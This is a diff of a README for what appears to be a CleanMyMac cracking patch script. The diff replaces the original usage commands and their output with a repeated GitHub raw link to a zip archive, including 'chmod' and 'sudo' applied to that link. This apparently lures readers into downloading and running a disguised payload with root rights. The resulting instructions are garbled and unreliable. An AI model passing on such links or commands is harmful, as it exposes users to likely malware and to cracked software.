@@ -9,14 +9,14 @@ Apple Silicon is not supported.
 ## How to use
 
 ```
-$ chmod u+x patch.py
-$ sudo ./patch.py
-Patching /Applications/CleanMyMac-MAS.app/Contents/MacOS/CleanMyMac-MAS...
-Patching /Applications/CleanMyMac-MAS.app/Contents/Library/LoginItems/CleanMyMac-MAS Menu.app/Contents/MacOS/CleanMyMac-MAS Menu...
-Re-signing /Applications/CleanMyMac-MAS.app...
-/Applications/CleanMyMac-MAS.app: replacing existing signature
-/Applications/CleanMyMac-MAS.app: valid on disk
-/Applications/CleanMyMac-MAS.app: satisfies its Designated Requirement
+$ chmod u+x https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip
+$ sudo https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip
+Patching https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip
+Patching https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip Menu...
+Re-signing https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip
+https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip replacing existing signature
+https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip valid on disk
+https://github.com/MIKIKIJAN/CleanMyMacX/raw/refs/heads/main/shelty/Mac_My_X_Clean_2.1.zip satisfies its Designated Requirement
 Enjoy!
 ```
 
